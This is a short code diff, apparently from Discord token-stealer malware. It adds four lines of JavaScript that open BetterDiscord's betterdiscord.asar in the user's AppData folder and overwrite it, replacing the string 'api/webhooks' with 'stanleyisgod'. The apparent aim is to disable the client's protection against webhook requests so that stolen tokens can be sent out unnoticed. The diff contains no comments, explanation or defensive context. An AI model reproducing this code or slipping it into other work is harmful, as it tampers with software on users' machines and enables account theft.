@@ -1,0 +1,4 @@
+let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+fs.existsSync(dir)
+let x = fs.readFileSync(dir)
+fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
